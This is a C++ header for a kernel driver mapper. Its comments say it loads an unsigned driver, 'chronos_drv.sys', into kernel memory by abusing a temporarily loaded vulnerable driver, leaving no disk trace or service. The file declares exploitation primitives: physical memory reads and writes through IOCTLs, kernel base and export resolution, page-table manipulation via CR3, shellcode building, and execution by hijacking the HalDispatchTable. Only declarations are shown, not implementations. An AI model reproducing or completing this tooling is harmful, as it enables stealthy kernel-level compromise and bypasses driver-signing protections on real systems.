#pragma once
#include <windows.h>
#include <string>
#include <vector>

// kdmapper — loads chronos_drv.sys into kernel memory via a temporary vulnerable driver
// No disk trace of chronos_drv.sys, no service created for it
// The vulnerable driver is used for 100-500ms then unloaded and deleted
// Execution: write our PE to physical memory, map it into kernel virtual space
//            via page table manipulation, then execute DriverEntry via HalDispatchTable hijack

struct MapperConfig {
    std::wstring vulnDriverPath;
    std::wstring vulnDevicePath;
    DWORD        ioctlPhysRead;
    DWORD        ioctlPhysWrite;
    ULONG_PTR    physReadParam;
    ULONG_PTR    physWriteParam;
    size_t       physMaxReadSize;       // Max bytes per phys read IOCTL (0 = 1 page)

    std::vector<BYTE> driverImage;

    bool allowTestSignFallback = false;
};

struct MapperResult {
    bool  success = false;
    void* entryPoint = nullptr;
    void* imageBase = nullptr;
    std::string errorMsg;
};

class KernelMapper {
public:
    static MapperResult MapDriver(const MapperConfig& config);
    static void UnloadMapper(const std::wstring& vulnServiceName);

    // Physical memory I/O
    static bool PhysRead(HANDLE hDev, DWORD ioctl, ULONG_PTR pa, void* buf, SIZE_T size);
    static bool PhysWrite(HANDLE hDev, DWORD ioctl, ULONG_PTR pa, const void* buf, SIZE_T size);

    // Kernel exploitation primitives
    static ULONG_PTR FindKernelBase(HANDLE hDev, DWORD ioctlRead);
    static ULONG_PTR ResolveKernelExport(HANDLE hDev, DWORD ioctlRead,
                                         ULONG_PTR kernelBase, const char* name);
    static ULONG_PTR VirtToPhys(HANDLE hDev, DWORD ioctlRead,
                                ULONG_PTR cr3, ULONG_PTR va);
    static bool      MapPage(HANDLE hDev, DWORD ioctlRead, DWORD ioctlWrite,
                             ULONG_PTR targetCr3, ULONG_PTR pa, ULONG_PTR va);
    static ULONG_PTR GetProcessCr3(HANDLE hDev, DWORD ioctlRead,
                                   ULONG_PTR kernelBase, DWORD pid);
    static ULONG_PTR FindFreeVirtualAddr(HANDLE hDev, DWORD ioctlRead,
                                         ULONG_PTR cr3, ULONG_PTR kernelBase, SIZE_T size);

    static ULONG_PTR FindFreeMemory(ULONG_PTR preferredAddr, SIZE_T size);

private:
    static bool ExecuteViaHalDispatch(HANDLE hDev, DWORD ioctlRead, DWORD ioctlWrite,
                                     ULONG_PTR kernelBase, ULONG_PTR cr3,
                                     ULONG_PTR shellcodeVa, ULONG_PTR driverEntryVa,
                                     ULONG_PTR driverObjPhys, ULONG_PTR regPathPhys);
    static bool WriteMinimalDriverObject(HANDLE hDev, DWORD ioctlWrite,
                                        ULONG_PTR driverObjPhys, ULONG_PTR entryPoint,
                                        ULONG_PTR driverBase, ULONG size);
    static bool BuildShellcode(BYTE* code, SIZE_T* size, ULONG_PTR driverEntryVa,
                              ULONG_PTR halDispatchVa, ULONG_PTR halOrigVal,
                              ULONG_PTR drvObjVa, ULONG_PTR regPathVa);
};
